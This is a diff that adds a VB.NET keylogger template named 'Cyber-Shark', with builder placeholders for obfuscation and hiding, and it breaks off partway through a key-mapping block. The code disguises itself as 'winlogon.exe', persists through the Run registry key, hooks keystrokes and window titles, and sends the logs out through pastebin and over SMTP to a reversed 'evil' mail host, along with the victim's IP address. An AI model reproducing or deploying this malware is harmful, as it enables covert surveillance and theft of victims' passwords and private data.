@@ -1,0 +1,1000 @@
+Imports Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.Net.Mail
+Imports System.Net
+Imports System.Text
+Imports System
+Imports System.Windows.Forms
+^IMPORT^
+
+<Assembly: AssemblyTitle("^1^")> 
+<Assembly: AssemblyDescription("^2^")> 
+<Assembly: AssemblyCompany("^3^")> 
+<Assembly: AssemblyProduct("^4^")> 
+<Assembly: AssemblyCopyright("^5^")> 
+<Assembly: AssemblyTrademark("^6^")> 
+<Assembly: AssemblyVersion("^%1^.^%2^.^%3^.^%4^")> 
+<Assembly: AssemblyFileVersion("^%1^.^%2^.^%3^.^%4^")> 
+
+Public Module GlavniNinja
+    Dim ^Logovi^ As String
+    Dim ^INSTALL^ As Object = ^PATH^ & "\"
+
+    ^JUNK^
+
+
+    ^API1^
+
+    Public Sub Main()
+        ^PROTECT^
+        ^HIDE^ 
+       
+
+        Dim ^t1^ As New System.Windows.Forms.Timer
+        Dim ^t2^ As New System.Windows.Forms.Timer
+        ^t1^.Interval = 123456789
+        ^t2^.Interval = 300
+        AddHandler ^t1^.Tick, AddressOf Tick1
+        AddHandler ^t2^.Tick, AddressOf Tick2
+        ^t1^.Start()
+        ^t2^.Start()
+
+		
+	  
+	    If My.Computer.FileSystem.FileExists(^INSTALL^ & "winlogon.exe") = True Then
+            Application.Run()
+        Else
+            InstallMe(^INSTALL^ & "winlogon.exe")
+            ^MSGBOX^
+        End If
+        
+    End Sub
+
+    ^API2^
+
+    Public Sub InstallMe(ByVal ^loc^ As String)
+        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, ^loc^)
+        Dim regKey As Microsoft.Win32.RegistryKey
+        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+        regKey.SetValue("REGDATA", Chr(34) & ^loc^ & Chr(34))
+        regKey.Close()
+        System.Diagnostics.Process.Start(^loc^)
+    End Sub
+
+    ^API3^
+
+
+    Public Sub Tick1(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Dim ^l^ As String = ^PasteBin^(^Logovi^)
+        SendData(^l^)
+    End Sub
+
+    ^API4^
+
+    Public Sub Tick2(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        If strin <> GetActiveWindowTitle() Then
+            ^Logovi^ = ^Logovi^ + vbNewLine & "[" & GetActiveWindowTitle() & "]:" + vbNewLine
+            strin = GetActiveWindowTitle()
+        End If
+    End Sub
+
+    ^API5^
+
+
+    Public Function ^PasteBin^(ByVal txt As String) As String
+        System.Net.ServicePointManager.Expect100Continue = False
+        Dim bPrivate As Integer
+        bPrivate = 0
+        Dim Fields As String = "?paste_private=" & bPrivate & "&paste_format=text" & "&paste_code=" & txt
+        Dim Web As New WebClient()
+        Web.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        Dim PostData As Byte() = Encoding.ASCII.GetBytes(Fields)
+        Dim RetData As Byte() = Web.UploadData("http://pastebin.com/api_public.php", "POST", PostData)
+        Dim Ret As String = Encoding.ASCII.GetString(RetData)
+        Return Ret
+    End Function
+
+    ^API6^
+
+    Public Sub SendData(ByVal logs As String)
+        ^GETSOFTWARE^
+	    Dim w As New System.Net.WebClient
+        Dim IP As String = System.Text.Encoding.ASCII.GetString((w.DownloadData("http://whatismyip.com/automation/n09230945.asp")))
+        Dim MailSetup As New MailMessage
+        MailSetup.Subject = My.Computer.Name & ":" & " === Cyber-Shark ===" & TimeOfDay
+        MailSetup.To.Add(StrReverse("USERNAME"))
+        MailSetup.From = New MailAddress(StrReverse("USERNAME"))
+        MailSetup.Body = vbNewLine & "OS : " & My.Computer.Info.OSFullName & vbNewLine & "IP Address :" & IP & vbNewLine & "===== PasteBin Logs =====" & vbNewLine & logs ^GETTHEM^
+        Dim ^SMTP^ As New SmtpClient(StrReverse("moc.evil.ptms"))
+        ^SMTP^.Port = 587
+        ^SMTP^.EnableSsl = True
+        ^SMTP^.Credentials = New Net.NetworkCredential(StrReverse("USERNAME"), StrReverse("PASSWORD"))
+        ^SMTP^.Send(MailSetup)
+        ^Logovi^ = String.Empty
+    End Sub
+
+    ^API7^
+
+    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
+    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
+    Dim strin As String = Nothing
+
+    Private Function GetActiveWindowTitle() As String
+        Dim MyStr As String
+        MyStr = New String(Chr(0), 100)
+        GetWindowText(GetForegroundWindow, MyStr, 100)
+        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
+        Return MyStr
+    End Function
+    Public Class KeyboardHook
+        Private Const HC_ACTION As Integer = 0
+        Private Const WH_KEYBOARD_LL As Integer = 13
+        Private Const WM_KEYDOWN = &H100
+        Private Const WM_KEYUP = &H101
+        Private Const WM_SYSKEYDOWN = &H104
+        Private Const WM_SYSKEYUP = &H105
+
+        Private Structure KBDLLHOOKSTRUCT
+            Public vkCode As Integer
+            Public scancode As Integer
+            Public flags As Integer
+            Public time As Integer
+            Public dwExtraInfo As Integer
+        End Structure
+
+        Private Declare Function SetWindowsHookEx Lib "user32" _
+        Alias "SetWindowsHookExA" _
+        (ByVal idHook As Integer, _
+        ByVal lpfn As KeyboardProcDelegate, _
+        ByVal hmod As Integer, _
+        ByVal dwThreadId As Integer) As Integer
+
+        Private Declare Function CallNextHookEx Lib "user32" _
+        (ByVal hHook As Integer, _
+        ByVal nCode As Integer, _
+        ByVal wParam As Integer, _
+        ByVal lParam As KBDLLHOOKSTRUCT) As Integer
+
+        Private Declare Function UnhookWindowsHookEx Lib "user32" _
+        (ByVal hHook As Integer) As Integer
+
+
+        Private Delegate Function KeyboardProcDelegate _
+        (ByVal nCode As Integer, _
+        ByVal wParam As Integer, _
+        ByRef lParam As KBDLLHOOKSTRUCT) As Integer
+
+
+        Public Shared Event KeyDown(ByVal Key As Keys)
+        Public Shared Event KeyUp(ByVal Key As Keys)
+
+        Private Shared KeyHook As Integer
+
+        Private Shared KeyHookDelegate As KeyboardProcDelegate
+
+        Public Sub New()
+
+            KeyHookDelegate = New KeyboardProcDelegate(AddressOf KeyboardProc)
+            KeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
+        End Sub
+
+        Private Shared Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
+
+            If (nCode = HC_ACTION) Then
+                Select Case wParam
+
+                    Case WM_KEYDOWN, WM_SYSKEYDOWN
+
+                        RaiseEvent KeyDown(CType(lParam.vkCode, Keys))
+                    Case WM_KEYUP, WM_SYSKEYUP
+
+                        RaiseEvent KeyUp(CType(lParam.vkCode, Keys))
+                End Select
+            End If
+
+            Return CallNextHookEx(KeyHook, nCode, wParam, lParam)
+        End Function
+        Protected Overrides Sub Finalize()
+
+            UnhookWindowsHookEx(KeyHook)
+            MyBase.Finalize()
+        End Sub
+    End Class
+    Private WithEvents kbHook As New KeyboardHook
+    Private Sub kbHook_KeyDown(ByVal Key As System.Windows.Forms.Keys) Handles kbHook.KeyDown
+        If My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = False Then
+            If Key = Keys.A Then
+                ^Logovi^ = ^Logovi^ & "a"
+            ElseIf Key = Keys.B Then
+                ^Logovi^ = ^Logovi^ & "b"
+            ElseIf Key = Keys.C Then
+                ^Logovi^ = ^Logovi^ & "c"
+            ElseIf Key = Keys.D Then
+                ^Logovi^ = ^Logovi^ & "d"
+            ElseIf Key = Keys.E Then
+                ^Logovi^ = ^Logovi^ & "e"
+            ElseIf Key = Keys.F Then
+                ^Logovi^ = ^Logovi^ & "f"
+            ElseIf Key = Keys.G Then
+                ^Logovi^ = ^Logovi^ & "g"
+            ElseIf Key = Keys.H Then
+                ^Logovi^ = ^Logovi^ & "h"
+            ElseIf Key = Keys.I Then
+                ^Logovi^ = ^Logovi^ & "i"
+            ElseIf Key = Keys.J Then
+                ^Logovi^ = ^Logovi^ & "j"
+            ElseIf Key = Keys.K Then
+                ^Logovi^ = ^Logovi^ & "k"
+            ElseIf Key = Keys.L Then
+                ^Logovi^ = ^Logovi^ & "l"
+            ElseIf Key = Keys.M Then
+                ^Logovi^ = ^Logovi^ & "m"
+            ElseIf Key = Keys.N Then
+                ^Logovi^ = ^Logovi^ & "n"
+            ElseIf Key = Keys.O Then
+                ^Logovi^ = ^Logovi^ & "o"
+            ElseIf Key = Keys.P Then
+                ^Logovi^ = ^Logovi^ & "p"
+            ElseIf Key = Keys.Q Then
+                ^Logovi^ = ^Logovi^ & "q"
+            ElseIf Key = Keys.R Then
+                ^Logovi^ = ^Logovi^ & "r"
+            ElseIf Key = Keys.S Then
+                ^Logovi^ = ^Logovi^ & "s"
+            ElseIf Key = Keys.T Then
+                ^Logovi^ = ^Logovi^ & "t"
+            ElseIf Key = Keys.U Then
+                ^Logovi^ = ^Logovi^ & "u"
+            ElseIf Key = Keys.V Then
+                ^Logovi^ = ^Logovi^ & "v"
+            ElseIf Key = Keys.W Then
+                ^Logovi^ = ^Logovi^ & "w"
+            ElseIf Key = Keys.X Then
+                ^Logovi^ = ^Logovi^ & "x"
+            ElseIf Key = Keys.Y Then
+                ^Logovi^ = ^Logovi^ & "y"
+            ElseIf Key = Keys.Z Then
+                ^Logovi^ = ^Logovi^ & "z"
+            ElseIf Key = Keys.D0 Then
+                ^Logovi^ = ^Logovi^ & "0"
+            ElseIf Key = Keys.D1 Then
+                ^Logovi^ = ^Logovi^ & "1"
+            ElseIf Key = Keys.D2 Then
+                ^Logovi^ = ^Logovi^ & "2"
+            ElseIf Key = Keys.D3 Then
+                ^Logovi^ = ^Logovi^ & "3"
+            ElseIf Key = Keys.D4 Then
+                ^Logovi^ = ^Logovi^ & "4"
+            ElseIf Key = Keys.D5 Then
+                ^Logovi^ = ^Logovi^ & "5"
+            ElseIf Key = Keys.D6 Then
+                ^Logovi^ = ^Logovi^ & "6"
+            ElseIf Key = Keys.D7 Then
+                ^Logovi^ = ^Logovi^ & "7"
+            ElseIf Key = Keys.D8 Then
+                ^Logovi^ = ^Logovi^ & "8"
+            ElseIf Key = Keys.D9 Then
+                ^Logovi^ = ^Logovi^ & "9"
+            ElseIf Key = Keys.NumPad0 Then
+                ^Logovi^ = ^Logovi^ & "0"
+            ElseIf Key = Keys.NumPad1 Then
+                ^Logovi^ = ^Logovi^ & "1"
+            ElseIf Key = Keys.NumPad2 Then
+                ^Logovi^ = ^Logovi^ & "2"
+            ElseIf Key = Keys.NumPad3 Then
+                ^Logovi^ = ^Logovi^ & "3"
+            ElseIf Key = Keys.NumPad4 Then
+                ^Logovi^ = ^Logovi^ & "4"
+            ElseIf Key = Keys.NumPad5 Then
+                ^Logovi^ = ^Logovi^ & "5"
+            ElseIf Key = Keys.NumPad6 Then
+                ^Logovi^ = ^Logovi^ & "6"
+            ElseIf Key = Keys.NumPad7 Then
+                ^Logovi^ = ^Logovi^ & "7"
+            ElseIf Key = Keys.NumPad8 Then
+                ^Logovi^ = ^Logovi^ & "8"
+            ElseIf Key = Keys.NumPad9 Then
+                ^Logovi^ = ^Logovi^ & "9"
+            ElseIf Key = Keys.Oemcomma Then
+                ^Logovi^ = ^Logovi^ & ","
+            ElseIf Key = Keys.OemMinus Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.OemQuotes Then
+                ^Logovi^ = ^Logovi^ & "'"
+            ElseIf Key = Keys.OemOpenBrackets Then
+                ^Logovi^ = ^Logovi^ & "["
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^ & "[BACK]"
+            ElseIf Key = Keys.OemCloseBrackets Then
+                ^Logovi^ = ^Logovi^ & "]"
+            ElseIf Key = Keys.OemQuestion Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.OemPipe Then
+                ^Logovi^ = ^Logovi^ & "\"
+            ElseIf Key = Keys.Oem1 Then
+                ^Logovi^ = ^Logovi^ & ";"
+            ElseIf Key = Keys.OemPeriod Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Oemtilde Then
+                ^Logovi^ = ^Logovi^ & "`"
+            ElseIf Key = Keys.Space Then
+                ^Logovi^ = ^Logovi^ & " "
+            ElseIf Key = Keys.Enter Then
+                ^Logovi^ = ^Logovi^ & vbNewLine
+            ElseIf Key = Keys.F1 Then
+                ^Logovi^ = ^Logovi^ & "[F1]"
+            ElseIf Key = Keys.F2 Then
+                ^Logovi^ = ^Logovi^ & "[F2]"
+            ElseIf Key = Keys.F3 Then
+                ^Logovi^ = ^Logovi^ & "[F3]"
+            ElseIf Key = Keys.F4 Then
+                ^Logovi^ = ^Logovi^ & "[F4]"
+            ElseIf Key = Keys.F5 Then
+                ^Logovi^ = ^Logovi^ & "[F5]"
+            ElseIf Key = Keys.F6 Then
+                ^Logovi^ = ^Logovi^ & "[F6]"
+            ElseIf Key = Keys.F7 Then
+                ^Logovi^ = ^Logovi^ & "[F7]"
+            ElseIf Key = Keys.F8 Then
+                ^Logovi^ = ^Logovi^ & "[F8]"
+            ElseIf Key = Keys.F9 Then
+                ^Logovi^ = ^Logovi^ & "[F9]"
+            ElseIf Key = Keys.F10 Then
+                ^Logovi^ = ^Logovi^ & "[F10]"
+            ElseIf Key = Keys.F11 Then
+                ^Logovi^ = ^Logovi^ & "[F11]"
+            ElseIf Key = Keys.F12 Then
+                ^Logovi^ = ^Logovi^ & "[F12]"
+            ElseIf Key = Keys.Delete Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Down Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Up Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Left Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Right Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Tab Then
+                ^Logovi^ = ^Logovi^ & "[TAB]"
+            ElseIf Key = Keys.End Then
+                ^Logovi^ = ^Logovi^ & "[END]"
+            ElseIf Key = Keys.Escape Then
+                ^Logovi^ = ^Logovi^ & "[ESC]"
+            ElseIf Key = Keys.Divide Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.Decimal Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Subtract Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.Add Then
+                ^Logovi^ = ^Logovi^ & "+"
+            ElseIf Key = Keys.Multiply Then
+                ^Logovi^ = ^Logovi^ & "*"
+            End If
+        ElseIf My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = True Then
+            If Key = Keys.A Then
+                ^Logovi^ = ^Logovi^ & "A"
+            ElseIf Key = Keys.B Then
+                ^Logovi^ = ^Logovi^ & "B"
+            ElseIf Key = Keys.C Then
+                ^Logovi^ = ^Logovi^ & "C"
+            ElseIf Key = Keys.D Then
+                ^Logovi^ = ^Logovi^ & "D"
+            ElseIf Key = Keys.E Then
+                ^Logovi^ = ^Logovi^ & "E"
+            ElseIf Key = Keys.F Then
+                ^Logovi^ = ^Logovi^ & "F"
+            ElseIf Key = Keys.G Then
+                ^Logovi^ = ^Logovi^ & "G"
+            ElseIf Key = Keys.H Then
+                ^Logovi^ = ^Logovi^ & "H"
+            ElseIf Key = Keys.I Then
+                ^Logovi^ = ^Logovi^ & "I"
+            ElseIf Key = Keys.J Then
+                ^Logovi^ = ^Logovi^ & "J"
+            ElseIf Key = Keys.K Then
+                ^Logovi^ = ^Logovi^ & "K"
+            ElseIf Key = Keys.L Then
+                ^Logovi^ = ^Logovi^ & "L"
+            ElseIf Key = Keys.M Then
+                ^Logovi^ = ^Logovi^ & "M"
+            ElseIf Key = Keys.N Then
+                ^Logovi^ = ^Logovi^ & "N"
+            ElseIf Key = Keys.O Then
+                ^Logovi^ = ^Logovi^ & "O"
+            ElseIf Key = Keys.P Then
+                ^Logovi^ = ^Logovi^ & "P"
+            ElseIf Key = Keys.Q Then
+                ^Logovi^ = ^Logovi^ & "Q"
+            ElseIf Key = Keys.R Then
+                ^Logovi^ = ^Logovi^ & "R"
+            ElseIf Key = Keys.S Then
+                ^Logovi^ = ^Logovi^ & "S"
+            ElseIf Key = Keys.T Then
+                ^Logovi^ = ^Logovi^ & "T"
+            ElseIf Key = Keys.U Then
+                ^Logovi^ = ^Logovi^ & "U"
+            ElseIf Key = Keys.V Then
+                ^Logovi^ = ^Logovi^ & "V"
+            ElseIf Key = Keys.W Then
+                ^Logovi^ = ^Logovi^ & "W"
+            ElseIf Key = Keys.X Then
+                ^Logovi^ = ^Logovi^ & "X"
+            ElseIf Key = Keys.Y Then
+                ^Logovi^ = ^Logovi^ & "Y"
+            ElseIf Key = Keys.Z Then
+                ^Logovi^ = ^Logovi^ & "Z"
+            ElseIf Key = Keys.D0 Then
+                ^Logovi^ = ^Logovi^ & "0"
+            ElseIf Key = Keys.D1 Then
+                ^Logovi^ = ^Logovi^ & "1"
+            ElseIf Key = Keys.D2 Then
+                ^Logovi^ = ^Logovi^ & "2"
+            ElseIf Key = Keys.D3 Then
+                ^Logovi^ = ^Logovi^ & "3"
+            ElseIf Key = Keys.D4 Then
+                ^Logovi^ = ^Logovi^ & "4"
+            ElseIf Key = Keys.D5 Then
+                ^Logovi^ = ^Logovi^ & "5"
+            ElseIf Key = Keys.D6 Then
+                ^Logovi^ = ^Logovi^ & "6"
+            ElseIf Key = Keys.D7 Then
+                ^Logovi^ = ^Logovi^ & "7"
+            ElseIf Key = Keys.D8 Then
+                ^Logovi^ = ^Logovi^ & "8"
+            ElseIf Key = Keys.D9 Then
+                ^Logovi^ = ^Logovi^ & "9"
+            ElseIf Key = Keys.NumPad0 Then
+                ^Logovi^ = ^Logovi^ & "0"
+            ElseIf Key = Keys.NumPad1 Then
+                ^Logovi^ = ^Logovi^ & "1"
+            ElseIf Key = Keys.NumPad2 Then
+                ^Logovi^ = ^Logovi^ & "2"
+            ElseIf Key = Keys.NumPad3 Then
+                ^Logovi^ = ^Logovi^ & "3"
+            ElseIf Key = Keys.NumPad4 Then
+                ^Logovi^ = ^Logovi^ & "4"
+            ElseIf Key = Keys.NumPad5 Then
+                ^Logovi^ = ^Logovi^ & "5"
+            ElseIf Key = Keys.NumPad6 Then
+                ^Logovi^ = ^Logovi^ & "6"
+            ElseIf Key = Keys.NumPad7 Then
+                ^Logovi^ = ^Logovi^ & "7"
+            ElseIf Key = Keys.NumPad8 Then
+                ^Logovi^ = ^Logovi^ & "8"
+            ElseIf Key = Keys.NumPad9 Then
+                ^Logovi^ = ^Logovi^ & "9"
+            ElseIf Key = Keys.Oemcomma Then
+                ^Logovi^ = ^Logovi^ & ","
+            ElseIf Key = Keys.OemMinus Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.OemQuotes Then
+                ^Logovi^ = ^Logovi^ & "'"
+            ElseIf Key = Keys.OemOpenBrackets Then
+                ^Logovi^ = ^Logovi^ & "["
+            ElseIf Key = Keys.OemCloseBrackets Then
+                ^Logovi^ = ^Logovi^ & "]"
+            ElseIf Key = Keys.OemQuestion Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.OemPipe Then
+                ^Logovi^ = ^Logovi^ & "\"
+            ElseIf Key = Keys.Oem1 Then
+                ^Logovi^ = ^Logovi^ & ";"
+            ElseIf Key = Keys.OemPeriod Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Oemtilde Then
+                ^Logovi^ = ^Logovi^ & "`"
+            ElseIf Key = Keys.Space Then
+                ^Logovi^ = ^Logovi^ & " "
+            ElseIf Key = Keys.Enter Then
+                ^Logovi^ = ^Logovi^ & vbNewLine
+            ElseIf Key = Keys.F1 Then
+                ^Logovi^ = ^Logovi^ & "[F1]"
+            ElseIf Key = Keys.F2 Then
+                ^Logovi^ = ^Logovi^ & "[F2]"
+            ElseIf Key = Keys.F3 Then
+                ^Logovi^ = ^Logovi^ & "[F3]"
+            ElseIf Key = Keys.F4 Then
+                ^Logovi^ = ^Logovi^ & "[F4]"
+            ElseIf Key = Keys.F5 Then
+                ^Logovi^ = ^Logovi^ & "[F5]"
+            ElseIf Key = Keys.F6 Then
+                ^Logovi^ = ^Logovi^ & "[F6]"
+            ElseIf Key = Keys.F7 Then
+                ^Logovi^ = ^Logovi^ & "[F7]"
+            ElseIf Key = Keys.F8 Then
+                ^Logovi^ = ^Logovi^ & "[F8]"
+            ElseIf Key = Keys.F9 Then
+                ^Logovi^ = ^Logovi^ & "[F9]"
+            ElseIf Key = Keys.F10 Then
+                ^Logovi^ = ^Logovi^ & "[F10]"
+            ElseIf Key = Keys.F11 Then
+                ^Logovi^ = ^Logovi^ & "[F11]"
+            ElseIf Key = Keys.F12 Then
+                ^Logovi^ = ^Logovi^ & "[F12]"
+            ElseIf Key = Keys.Delete Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Down Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Up Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Left Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Right Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Tab Then
+                ^Logovi^ = ^Logovi^ & "[TAB]"
+            ElseIf Key = Keys.End Then
+                ^Logovi^ = ^Logovi^ & "[END]"
+            ElseIf Key = Keys.Escape Then
+                ^Logovi^ = ^Logovi^ & "[ESC]"
+            ElseIf Key = Keys.Divide Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.Decimal Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Subtract Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.Add Then
+                ^Logovi^ = ^Logovi^ & "+"
+            ElseIf Key = Keys.Multiply Then
+                ^Logovi^ = ^Logovi^ & "*"
+            End If
+        ElseIf My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.CapsLock = True Then
+            If Key = Keys.D1 Then
+                ^Logovi^ = ^Logovi^ + "!"
+            ElseIf Key = Keys.D2 Then
+                ^Logovi^ = ^Logovi^ + "@"
+            ElseIf Key = Keys.D3 Then
+                ^Logovi^ = ^Logovi^ + "#"
+            ElseIf Key = Keys.D4 Then
+                ^Logovi^ = ^Logovi^ + "$"
+            ElseIf Key = Keys.D5 Then
+                ^Logovi^ = ^Logovi^ + "%"
+            ElseIf Key = Keys.D6 Then
+                ^Logovi^ = ^Logovi^ + "^"
+            ElseIf Key = Keys.D7 Then
+                ^Logovi^ = ^Logovi^ + "&"
+            ElseIf Key = Keys.D8 Then
+                ^Logovi^ = ^Logovi^ + "*"
+            ElseIf Key = Keys.D9 Then
+                ^Logovi^ = ^Logovi^ + "("
+            ElseIf Key = Keys.D0 Then
+                ^Logovi^ = ^Logovi^ + ")"
+            ElseIf Key = Keys.A Then
+                ^Logovi^ = ^Logovi^ & "A"
+            ElseIf Key = Keys.B Then
+                ^Logovi^ = ^Logovi^ & "B"
+            ElseIf Key = Keys.C Then
+                ^Logovi^ = ^Logovi^ & "C"
+            ElseIf Key = Keys.D Then
+                ^Logovi^ = ^Logovi^ & "D"
+            ElseIf Key = Keys.E Then
+                ^Logovi^ = ^Logovi^ & "E"
+            ElseIf Key = Keys.F Then
+                ^Logovi^ = ^Logovi^ & "F"
+            ElseIf Key = Keys.G Then
+                ^Logovi^ = ^Logovi^ & "G"
+            ElseIf Key = Keys.H Then
+                ^Logovi^ = ^Logovi^ & "H"
+            ElseIf Key = Keys.I Then
+                ^Logovi^ = ^Logovi^ & "I"
+            ElseIf Key = Keys.J Then
+                ^Logovi^ = ^Logovi^ & "J"
+            ElseIf Key = Keys.K Then
+                ^Logovi^ = ^Logovi^ & "K"
+            ElseIf Key = Keys.L Then
+                ^Logovi^ = ^Logovi^ & "L"
+            ElseIf Key = Keys.M Then
+                ^Logovi^ = ^Logovi^ & "M"
+            ElseIf Key = Keys.N Then
+                ^Logovi^ = ^Logovi^ & "N"
+            ElseIf Key = Keys.O Then
+                ^Logovi^ = ^Logovi^ & "O"
+            ElseIf Key = Keys.P Then
+                ^Logovi^ = ^Logovi^ & "P"
+            ElseIf Key = Keys.Q Then
+                ^Logovi^ = ^Logovi^ & "Q"
+            ElseIf Key = Keys.R Then
+                ^Logovi^ = ^Logovi^ & "R"
+            ElseIf Key = Keys.S Then
+                ^Logovi^ = ^Logovi^ & "S"
+            ElseIf Key = Keys.T Then
+                ^Logovi^ = ^Logovi^ & "T"
+            ElseIf Key = Keys.U Then
+                ^Logovi^ = ^Logovi^ & "U"
+            ElseIf Key = Keys.V Then
+                ^Logovi^ = ^Logovi^ & "V"
+            ElseIf Key = Keys.W Then
+                ^Logovi^ = ^Logovi^ & "W"
+            ElseIf Key = Keys.X Then
+                ^Logovi^ = ^Logovi^ & "X"
+            ElseIf Key = Keys.Y Then
+                ^Logovi^ = ^Logovi^ & "Y"
+            ElseIf Key = Keys.Z Then
+                ^Logovi^ = ^Logovi^ & "Z"
+            ElseIf Key = Keys.Oemcomma Then
+                ^Logovi^ = ^Logovi^ & "<"
+            ElseIf Key = Keys.OemMinus Then
+                ^Logovi^ = ^Logovi^ & "_"
+            ElseIf Key = Keys.OemOpenBrackets Then
+                ^Logovi^ = ^Logovi^ & "{"
+            ElseIf Key = Keys.OemCloseBrackets Then
+                ^Logovi^ = ^Logovi^ & "}"
+            ElseIf Key = Keys.OemQuestion Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.OemPipe Then
+                ^Logovi^ = ^Logovi^ & "|"
+            ElseIf Key = Keys.Oem1 Then
+                ^Logovi^ = ^Logovi^ & ":"
+            ElseIf Key = Keys.OemPeriod Then
+                ^Logovi^ = ^Logovi^ & ">"
+            ElseIf Key = Keys.Oemtilde Then
+                ^Logovi^ = ^Logovi^ & "~"
+            ElseIf Key = Keys.OemQuotes Then
+                ^Logovi^ = ^Logovi^ & "'"
+            ElseIf Key = Keys.Space Then
+                ^Logovi^ = ^Logovi^ & " "
+            ElseIf Key = Keys.Enter Then
+                ^Logovi^ = ^Logovi^ & vbNewLine
+            ElseIf Key = Keys.F1 Then
+                ^Logovi^ = ^Logovi^ & "[F1]"
+            ElseIf Key = Keys.F2 Then
+                ^Logovi^ = ^Logovi^ & "[F2]"
+            ElseIf Key = Keys.F3 Then
+                ^Logovi^ = ^Logovi^ & "[F3]"
+            ElseIf Key = Keys.F4 Then
+                ^Logovi^ = ^Logovi^ & "[F4]"
+            ElseIf Key = Keys.F5 Then
+                ^Logovi^ = ^Logovi^ & "[F5]"
+            ElseIf Key = Keys.F6 Then
+                ^Logovi^ = ^Logovi^ & "[F6]"
+            ElseIf Key = Keys.F7 Then
+                ^Logovi^ = ^Logovi^ & "[F7]"
+            ElseIf Key = Keys.F8 Then
+                ^Logovi^ = ^Logovi^ & "[F8]"
+            ElseIf Key = Keys.F9 Then
+                ^Logovi^ = ^Logovi^ & "[F9]"
+            ElseIf Key = Keys.F10 Then
+                ^Logovi^ = ^Logovi^ & "[F10]"
+            ElseIf Key = Keys.F11 Then
+                ^Logovi^ = ^Logovi^ & "[F11]"
+            ElseIf Key = Keys.F12 Then
+                ^Logovi^ = ^Logovi^ & "[F12]"
+            ElseIf Key = Keys.Delete Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Down Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Up Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Left Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Right Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Tab Then
+                ^Logovi^ = ^Logovi^ & "[TAB]"
+            ElseIf Key = Keys.End Then
+                ^Logovi^ = ^Logovi^ & "[END]"
+            ElseIf Key = Keys.Escape Then
+                ^Logovi^ = ^Logovi^ & "[ESC]"
+            ElseIf Key = Keys.Divide Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.Decimal Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Subtract Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.Add Then
+                ^Logovi^ = ^Logovi^ & "+"
+            ElseIf Key = Keys.Multiply Then
+                ^Logovi^ = ^Logovi^ & "*"
+            End If
+        ElseIf My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = True Then
+            If Key = Keys.D1 Then
+                ^Logovi^ = ^Logovi^ + "1"
+            ElseIf Key = Keys.D2 Then
+                ^Logovi^ = ^Logovi^ + "2"
+            ElseIf Key = Keys.D3 Then
+                ^Logovi^ = ^Logovi^ + "3"
+            ElseIf Key = Keys.D4 Then
+                ^Logovi^ = ^Logovi^ + "4"
